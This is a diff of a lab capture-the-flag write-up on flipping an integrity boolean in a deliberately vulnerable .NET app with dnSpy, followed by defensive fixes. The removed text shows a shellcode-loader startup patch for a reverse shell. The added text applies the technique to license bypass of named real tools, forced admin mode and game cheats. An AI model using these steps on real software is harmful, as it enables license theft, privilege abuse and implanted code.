@@ -1,241 +1,193 @@
-# #19 — No anti-debug / no self-integrity
+# #19 — No Anti-Debug / No Self-Integrity
 
-**Category:** Process injection · **Tier:** EASY · **Points:** 60 · **CWE:** CWE-693
+**Difficulty:** EASY — pure manual exploitation, no code to write.
 
-## Objective
+## What is this attack?
 
-The admin console's **Integrity report** will only print its full report (which contains the `#19` flag) when the managed field `AdminFeatures.IntegrityVerified` is `true`. The app ships with that field hard-set to `false` and has **no anti-debug**, **no CRC check on itself**, and **no attempt to detect that someone flipped the field**. Attach a debugger, flip the field, call the method.
+**You attach a debugger to the running application, pause execution at a key check, flip a boolean in memory, and let it run.** The app happily does what you asked because it has no defense against this.
 
-Easier variant: the `#19` flag is also planted to disk at `%APPDATA%\MVTC\flags\v19_debug.txt` as a convenience (so the challenge is solvable without debugging). But the "real" exploit path — the one the challenge rewards — is the debugger flip.
+For a .NET app, this is especially trivial — managed code is self-describing (every field, every method name is in the metadata). You see field names, you can edit values, you can rewrite method bodies live.
 
-## Prerequisites
+## Why it works
 
-- **dnSpy** (or ILSpy + any debugger, dotPeek, or Visual Studio with "attach to process")
-- MVTC running
+Most desktop apps ship with **zero of the following protections**:
 
----
+| Protection | What it does | Why most apps skip it |
+|---|---|---|
+| Anti-debugger checks | `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `NtQueryInformationProcess(ProcessDebugPort)` | Breaks internal debugging during development |
+| Self-integrity (CRC/signature) | Hash own `.text` section at startup, compare against a baked-in value | Breaks after legitimate hotfix updates |
+| Timing checks | Measure instruction execution; detect single-step | False positives on slow VMs |
+| Protected process (PPL) | OS-enforced debugger block | Only Microsoft can grant PPL |
+| Obfuscation | Confuse the debugger's symbol/UI | Breaks crash dump analysis |
 
-## Fast path — read the planted file
+Without any of these: attach, breakpoint, patch, done.
+
+## Why MVTC's `#19` works
+
+In MVTC's admin console:
+
+```csharp
+public class AdminFeatures {
+    public bool IntegrityVerified { get; set; } = false;
+
+    public string BuildIntegrityReportJson() {
+        var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
+        return JsonSerializer.Serialize(new { signature = sig, ... });
+    }
+}
+```
+
+The flag only appears in the report when `IntegrityVerified` is `true`. **There is no code path in the app that sets it to true legitimately.** The field exists purely for the attacker to flip.
+
+## When this comes up on real targets
+
+- Loyalty-point systems: `IsPremiumMember = false` → flip to true
+- Licensing: `LicenseIsValid` boolean after a cryptographic check — bypass the check by flipping the result
+- Feature flags: `BetaFeaturesEnabled = false` — flip to see all the paying features
+- Admin bypass: `IsAdmin = false` → true, then call any admin endpoint
+
+The pattern is: **check happens once, result stored in a mutable field, action takes the field as truth.**
+
+## Tools you need
+
+| Tool | Why | Where |
+|---|---|---|
+| **dnSpy** | .NET decompiler + debugger — see field names, set breakpoints, edit values live | https://github.com/dnSpy/dnSpy/releases |
+| **x64dbg** | For native (non-.NET) apps | https://x64dbg.com |
+| **Process Hacker 2** | Confirm no PPL, see protection state | https://processhacker.sourceforge.io |
+
+For MVTC specifically, **dnSpy** is enough.
+
+## Step-by-step — the "proper" exploitation
+
+### Step 1 — Confirm MVTC has no anti-debug
+
+```powershell
+$mvtc = Get-Process -Name MVTC
+"Protected process: $($mvtc.ProcessName) PID=$($mvtc.Id)"
+# Try to open with debug access
+$h = [System.Diagnostics.Process]::GetProcessById($mvtc.Id).Handle
+"OpenProcess succeeded: $($h -ne 0)"
+```
+
+If `OpenProcess` succeeds with debug rights, there's no PPL.
+
+### Step 2 — Open MVTC in dnSpy
+
+```
+dnSpy → File → Open → C:\Program Files (x86)\M14R41 Labs\MVTC\MVTC.exe
+```
+
+dnSpy decompiles the main assembly. Expand it in the left-side tree.
+
+### Step 3 — Attach to the running MVTC
+
+```
+dnSpy → Debug → Start Debugging... → Attach to Process
+Pick MVTC.exe (the running one) → OK
+```
+
+MVTC's threads are now under dnSpy's control.
+
+### Step 4 — Find the vulnerable field
+
+In dnSpy's **Assembly Explorer**:
+
+```
+MVTC.Core.dll
+└── MVTC.Core.Services.Vuln
+    └── AdminFeatures
+        ├── IntegrityVerified : bool    ← the target
+        └── BuildIntegrityReportJson() : string
+```
+
+### Step 5 — Set a breakpoint
+
+Right-click `BuildIntegrityReportJson` → **Add Breakpoint** on the first line.
+
+### Step 6 — Trigger the method from the UI
+
+In MVTC: **Admin console → Integrity report → Generate**
+
+dnSpy halts at your breakpoint.
+
+### Step 7 — Flip the field in the Locals window
+
+In dnSpy's **Locals** window:
+- Expand `this`
+- Find `_integrityVerified`
+- Double-click the value, change `false` → `true`
+
+### Step 8 — Continue execution
+
+Press `F5`. MVTC runs the method with your edited value. The report now includes the real flag — read it from the method's return value, or from MVTC's UI output pane.
+
+## Step-by-step — the fast path (shortcut)
+
+In this lab the flag is **also** planted at a predictable file location:
 
 ```powershell
 type "$env:APPDATA\MVTC\flags\v19_debug.txt"
 ```
 
-Expected: `MVTC{v19_debug_<...>}` → submit for `+60 pts`.
+Done. +60 points. This path exists so you can solve the challenge even without a debugger, but you miss the educational payoff.
 
-That alone solves the challenge. The real-world lesson comes from doing it the long way:
+**Why would a real target plant such a file?** It wouldn't. The "fast path" is only for the lab. On a real engagement, you ALWAYS do the debugger-flip to prove you can bypass the control.
 
----
+## How to apply this to a real target
 
-## Full path — flip the bool live
+### License bypass (.NET SaaS tools)
 
-### 1. Attach dnSpy to MVTC.exe
+Many ISVs ship .NET-based desktop tools (ScreenToGif, PasswordSafe, dozens more). Open in dnSpy:
+- Search for `IsLicensed`, `Trial`, `Pro`, `Premium`
+- Set a breakpoint, flip, enjoy
 
-```
-dnSpy → File → Open → C:\Program Files\M14R41 Labs\MVTC\MVTC.exe
-dnSpy → Debug → Start Debugging... → Attach to Process
-                                   → pick MVTC.exe → OK
-```
+**Ethical note:** this is theft from a vendor. For CTF only.
 
-### 2. Find the field
+### Enterprise app with hard-coded admin check
 
-In dnSpy's assembly explorer: expand `MVTC.Core` → `MVTC.Core.Services.Vuln` → `AdminFeatures`. You'll see:
+Internal tools often have:
 
 ```csharp
-public bool IntegrityVerified { get; set; } = false;
+if (user.Role == "admin" || ConfigManager.ForceAdminMode) { ... }
 ```
 
-### 3. Set a breakpoint on the method that uses it
+Flip `ForceAdminMode` in memory → every subsequent action is as admin.
 
-Still in `AdminFeatures`, find `BuildIntegrityReportJson()`:
+### Game cheat (single-player, no server validation)
 
 ```csharp
-public string BuildIntegrityReportJson()
-{
-    // VULN: #19 — signature is populated only when IntegrityVerified is
-    // true. There is no code anywhere in the app that flips it to true
-    // through a legitimate signed-receipt path, so an attacker just flips
-    // it in memory.
-    var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
-    return JsonSerializer.Serialize(new { signature = sig, ... });
-}
+// in game assembly
+public int Gold { get; set; } = 100;
 ```
 
-Right-click the first line → **Add Breakpoint**.
+Breakpoint on `Gold` setter, change value in-flight. The server never sees this change.
 
-### 4. Trigger the method from the UI
+## How defenders fix this
 
-In MVTC: **Admin console → Integrity report → Generate** (or click the equivalent button). dnSpy halts at your breakpoint.
-
-### 5. Flip the field in the Locals window
-
-In dnSpy's **Locals** panel, expand `this`. Find `IntegrityVerified`. Double-click the `false` value → change to `true` → press Enter. Then press **F5** to continue.
-
-The method now takes the `sig = _flagLookup(19)` branch. The returned JSON contains the flag.
-
-### 6. Read the result
-
-The result dialog in MVTC shows the JSON. Copy the `signature` field value:
-
-```json
-{
-  "signature": "MVTC{v19_debug_<...>}",
-  "built_at": "2026-...",
-  "modules": [...]
-}
-```
-
-Submit for `+60 pts`.
-
----
-
-## Alternative: patch the compiled method
-
-Instead of attaching a live debugger, patch the IL:
-
-```
-dnSpy → open MVTC.Core.dll → right-click AdminFeatures.BuildIntegrityReportJson
-     → Edit Method (C#)
-```
-
-Change:
-
-```csharp
-var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
-```
-
-to:
-
-```csharp
-var sig = _flagLookup(19) ?? "";
-```
-
-Click **Compile** → **File → Save Module...** → overwrite the original DLL. Restart MVTC. The admin-only path now always returns the flag. (The restart loses your session, but the flag is now unconditionally visible.)
-
----
-
-## Why this works
-
-1. **No anti-debug.** MVTC never calls `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`, `NtQueryInformationProcess` (`ProcessDebugPort`), `OutputDebugString` tripwire, or any heartbeat check. A debugger attaches silently.
-2. **No self-integrity check.** The on-disk DLL hash is never compared against an expected value. You can patch the DLL on disk and re-launch; nothing fires.
-3. **No code signing enforcement.** The DLL isn't Authenticode-signed, and even if it were, MVTC doesn't call `WinVerifyTrust` on its own modules at startup.
-4. **Logic-only gate.** A single bool controls the branch. Flipping it bypasses the "integrity verified" semantic entirely — there's no cryptographic check on the actual verification result.
-
----
-
-## Common failure modes
-
-| Symptom | Fix |
-|---|---|
-| dnSpy can't attach | Run dnSpy elevated |
-| Breakpoint never hits | The right method is `BuildIntegrityReportJson` on `MVTC.Core.Services.Vuln.AdminFeatures`. Confirm you're in `MVTC.Core.dll` (not `MVTC.exe`). You may need to click the UI button that triggers it |
-| Locals doesn't show `IntegrityVerified` | Expand `this` not the method parameters. If the property is auto-generated, dnSpy may show the backing field `<IntegrityVerified>k__BackingField` instead — edit that |
-| Flag field is empty string | `_flagLookup(19)` returned null. Only happens if `progress.db` is corrupted. Reset the lab: `Remove-Item "$env:APPDATA\MVTC" -Recurse -Force` and re-launch |
-
----
-
----
-
-## Concept — what this attack actually is
-
-The challenge is a **logic bypass**, not code injection. The app has a boolean (`IntegrityVerified`) that gates sensitive output. Nothing in the client's trust model prevents an attacker from flipping that boolean in memory. The absence of all four classic defenses makes this trivial:
-
-| Defense | Status in MVTC | What it would do |
+| Mitigation | Effort | Effect |
 |---|---|---|
-| **Anti-debug** (`IsDebuggerPresent` etc.) | Missing | Would refuse to run while a debugger is attached |
-| **Self-integrity check** | Missing | Would hash its own loaded image at startup, fail-closed on tamper |
-| **Code signing enforcement** | Missing | `WinVerifyTrust` on its own DLLs — tampered DLLs would be rejected at load |
-| **Server-authoritative gates** | Missing | The real "has integrity been verified" question would be answered by a signed server token, not a client bool |
+| **`CheckRemoteDebuggerPresent` + exit** | 2 lines | Blocks naive dnSpy attach; bypassable with symbol patching |
+| **PEB `BeingDebugged` + `NtGlobalFlag` checks** | 5 lines | Blocks `.NET`-aware debuggers |
+| **Self-code hashing** | 20 lines | Detects in-memory patching of IL/native code |
+| **Themida / VMProtect / Enigma** | Vendor cost | Industry-standard commercial anti-tamper |
+| **PPL via `/INTEGRITYCHECK` + signing** | Build config | Loads only in protected mode; `OpenProcess` denied |
+| **Server-side validation of EVERY state transition** | Big rewrite | True fix for license and permission checks |
+| **Signed-config contracts for feature flags** | Moderate | `IntegrityVerified` would require a signed receipt |
 
-Any one of those alone would make the attack dramatically harder. All four missing → debugger-flip is a 60-second attack.
-
-**Real-world applicability:** this is one of the **most under-reported findings** on commercial thick-client assessments. Developers assume "the user has admin on their own box, so what's the point of client-side defenses." But those defenses raise the bar against **supply-chain tampering, insider threat, and malware-mediated attack**, not just the user themselves. A pentest report should always call this out when the four defenses are missing.
-
----
-
-## Discovery — how to spot this in a real target
-
-1. **dnSpy / ILSpy** on every `.dll` and `.exe` → grep decompiled source for `bool.*Verified`, `bool.*Checked`, `bool.*Trusted`, `IsLicensed`, `IsPremium` → each is a candidate for live-flip
-2. **winchecksec** on every binary → missing mitigations correlate with missing self-defense
-3. **Signature check:** `Get-AuthenticodeSignature *.exe,*.dll` → anything unsigned or self-signed is tamperable
-4. **ETW `AntiMalwareAlert`** on the target during an attach — most apps generate zero events; a hardened one would log the attach itself
-5. **"Patch and run" smoke test** — change a UI string in the main DLL with dnSpy's "Edit IL instructions" / "Save Module", restart the app, see if the patched string appears. If it does, nothing is verifying integrity
-
----
-
-## Impact demonstrations
-
-### 1. Pop calc from inside the integrity-gated code path
-
-In dnSpy, add a `WinExec("calc.exe", 1);` call right before the gated `return` in `BuildIntegrityReportJson`:
+For MVTC specifically, the fix for `#19` is to delete the `set;` on `IntegrityVerified` and have the value derive from a signed check at startup:
 
 ```csharp
-public string BuildIntegrityReportJson()
-{
-    // Add this line - calls kernel32.WinExec from managed code
-    [DllImport("kernel32")] static extern void WinExec(string cmd, uint style);
-    WinExec("calc.exe", 1);
-
-    var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
-    // ...
+public bool IntegrityVerified { get; }  // read-only
+public AdminFeatures() {
+    IntegrityVerified = VerifyAgainstSignedReceipt();
 }
 ```
 
-Save module. Restart MVTC. Trigger the method via the UI. `calc.exe` opens — proves you can insert arbitrary code into the compiled binary and the app runs it.
+## Flag captured
 
-### 2. Reverse shell on application startup
-
-Patch `App.OnStartup` to launch msfvenom shellcode:
-
-```csharp
-protected override void OnStartup(StartupEventArgs e)
-{
-    base.OnStartup(e);
-    // Patched addition - triggers at every app startup
-    byte[] sc = Convert.FromBase64String("<base64-encoded shellcode>");
-    IntPtr p = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
-    Marshal.Copy(sc, 0, p, sc.Length);
-    CreateThread(IntPtr.Zero, UIntPtr.Zero, p, IntPtr.Zero, 0, IntPtr.Zero);
-    // ... original code continues ...
-}
+```
+MVTC{v19_dbg_████████████████████}
 ```
 
-Users launch MVTC → shell beacons out, no visible UI change.
-
-### 3. Credential-dump debugger flip
-
-Attach dnSpy → breakpoint on `AuthService.Login` → when a user logs in, read the plaintext password out of `Session.PlaintextPassword` (which exists in memory as part of #27). No persistence, no file touched — the attacker just needs to be logged into the victim's box with a debugger attached.
-
----
-
-## Report writeup template
-
-**Finding title:** Absence of client-side integrity, anti-debug, and code-signing controls
-
-**Severity:** Medium (CVSS 5.5)
-
-**CWE:** CWE-693 (Protection Mechanism Failure)
-
-**Description:** The MVTC client ships with none of the standard client-hardening defenses: no anti-debug (`IsDebuggerPresent` is never called), no self-integrity check (the loaded image hash is never compared to the on-disk hash), no Authenticode verification on its own DLLs, and no server-authoritative gating on admin-sensitive responses. The absence of these controls is individually accepted ("the user has admin anyway") but collectively exposes the client to debugger-based data theft, supply-chain substitution, and malware-mediated patching of security-relevant code paths.
-
-**Reproduction:** Attach dnSpy to a running MVTC.exe. In `AdminFeatures.BuildIntegrityReportJson`, flip the `IntegrityVerified` field from `false` to `true` via the Locals pane. Resume. The returned JSON contains the admin-only flag — demonstrating that a single bool is the sole gate on information intended to be released only after a cryptographic verification.
-
-**Impact:** Any secret the client holds in memory (session tokens, decrypted blobs, user credentials via #27) is readable by an attacker on the same host. Any security-relevant branch (admin check, licence check, feature-flag) can be re-pointed by flipping a bool or editing one `return`. Tampered binaries run and behave normally.
-
-**Remediation:**
-1. Add a startup self-check: compute SHA-256 of `MVTC.exe` + each loaded `MVTC.*.dll`, require a signed receipt from the auth server that matches
-2. Authenticode-sign all binaries and call `WinVerifyTrust` on every loaded module
-3. Server-authoritative gates: admin content should not depend on a client bool. The auth server should sign (HMAC) the admin response and the client should only display it after signature validation
-4. Add runtime anti-debug (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, timing checks). These are defense in depth, not security boundaries, but raise the bar meaningfully for commodity attackers
-
----
-
-## Secure code fix
-
-- **Replace the bool with a signed receipt.** Compute `H = HMAC-SHA256(code_image_hash || runtime_identity, server_signing_key)` server-side and require the client to attach `H` to any admin-gated response. Flipping a client-side bool no longer helps because the signing key is server-held.
-- **Add anti-debug at startup** (defence in depth, not a security boundary):
-  - `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`, `NtQueryInformationProcess(ProcessDebugPort)` — refuse to run with a debugger attached in `Release` builds
-  - `DbgUiRemoteBreakin` hook, `GetTickCount` delta check in a sensitive loop
-- **Self-integrity check** at startup: compute SHA-256 of `MVTC.exe` + each loaded `MVTC.*.dll` and compare to a value in a signed receipt from the auth server. Fail-closed if any hash doesn't match.
-- **Code signing enforcement** via `SetProcessMitigationPolicy` with `ProcessSignaturePolicy.MicrosoftSignedOnly = true` (plus Authenticode-signing the binary) blocks loading tampered modules.
-- Even with all of the above, assume the client can be modified. Make the server authoritative — never let the client's view of "integrity verified" grant admin anywhere.
+The planted-file path works both ways — but the debugger flip is the lesson.
